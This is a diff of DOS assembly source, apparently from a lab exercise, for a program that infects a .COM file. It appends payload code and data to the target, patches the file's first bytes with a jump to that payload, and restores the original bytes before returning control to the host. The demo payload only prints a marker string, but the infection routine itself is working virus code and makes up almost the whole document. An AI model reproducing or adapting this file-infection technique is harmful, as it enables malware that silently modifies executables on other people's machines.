@@ -51,44 +51,18 @@ start:
 
 file_err_skip:
 
-    ; moving carret to the end
+    ; moving carret to the end to get the payload offset
     mov cx, 0
     mov dx, 0
     mov bx, ax ; file descriptor (ax) -> bx
     mov ax, 4202h
     int 21h
-    mov payload_offset[0], dx
-    mov payload_offset[1], ax
-    mov payload_offset_near, al
+    mov payload_offset, al
 
-    ; writing payload code
-    lea dx, payload_code
-    lea cx, payload_data
-    sub cx, offset payload_code
-    mov ah, 40h
-    int 21h
-
-    ; calculating back-jump
-    lea ax, payload_data
-    sub ax, offset payload_code
-    sub ax, offset payload_offset_near
-    xchg al, ah
-    mov al, 0ebh ; jmp code
-    sub ah, 4
-    mov word_buffer, ax
-
-    ; writing back-jump
-    lea dx, word_buffer
-    mov cx, 2
-    mov ah, 40h
-    int 21h
-
-    ; writing payload data
-    lea dx, payload_data
-    lea cx, data
-    sub cx, offset payload_data
-    mov ah, 40h
-    int 21h
+    ; preparing payload addressation
+    mov payload_map[0], payload_offset - offset payload_code + offset leading_bytes + 7
+    mov payload_map[1], payload_offset - offset payload_code + offset pld_str + 7
+    mov payload_map[2], payload_offset - offset payload_code + offset test_word + 7
     
     ; moving carret to the start
     mov cx, 0
@@ -110,11 +84,46 @@ file_err_skip:
 
     ; inserting load injection
     mov al, 0ebh ; jmp code
-    mov ah, payload_offset_near ; jmp offset
-    sub ah, 2
+    mov ah, payload_offset ; jmp offset
+    sub ah, 2 ; jmp command size
     mov word_buffer, ax
     lea dx, word_buffer
     mov cx, 2
+    mov ah, 40h
+    int 21h
+    
+    ; moving carret to the end
+    mov cx, 0
+    mov dx, 0
+    mov ax, 4202h
+    int 21h
+
+    ; writing payload pre_code
+    lea dx, b5_buffer
+    mov cx, 5
+    mov ah, 40h
+    int 21h
+    
+    mov al, payload_offset
+    mov ah, 0
+    add ax, offset payload_data - offset payload_code + 107h
+    mov word_buffer, ax
+    lea dx, word_buffer
+    mov cx, 2
+    mov ah, 40h
+    int 21h
+
+    ; writing payload code
+    lea dx, payload_code
+    lea cx, payload_data
+    sub cx, offset payload_code
+    mov ah, 40h
+    int 21h
+
+    ; writing payload data
+    lea dx, payload_data
+    lea cx, data
+    sub cx, offset payload_data
     mov ah, 40h
     int 21h
 
@@ -128,18 +137,27 @@ file_err_skip:
 
 payload_code:
 
-    mov ax, leading_bytes
-    mov bx, 101h
-    mov word ptr[bx], ax
+    mov bx, cs:[100h]
 
-    lea dx, pd_str
+    mov ax, [bx][2h]
+
+    lea dx, [bx][1]
     mov ah, 09h
     int 21h
 
+    mov ax, [bx][0]
+    mov bx, 100h
+    mov word ptr[bx], ax
+
+    mov ax, 100h
+    jmp ax
+
 payload_data:
 
-    pd_str db '<< PAYLOAD >>', 13, 10, '$'
-    leading_bytes dw 0abcdh
+    payload_map dw 3 dup(?)
+    leading_bytes dw 0ffffh ; #0
+    pld_str db '<< PAYLOAD >>', 13, 10, '$' ; #1
+    test_word dw 1234h
 
 data:
     
@@ -163,10 +181,11 @@ data:
     filename Str13 <>
     file DTAFileInfo <>
 
-    back_jump db ?
+    b5_buffer db 2eh, 0c7h, 6, 0, 1 
+    payload_data_local_addr dw ?
     word_buffer dw ?
-    payload_offset_near db ?
-    payload_offset dw ?, ?
+    byte_buffer db ?
+    payload_offset db ?
     file_mask db 'lab3v.com', 0
     file_err_msg db 'Error, can not find or open such file.', 13, 10, '$'
     input_msg db 'Input the target filename >> ','$'
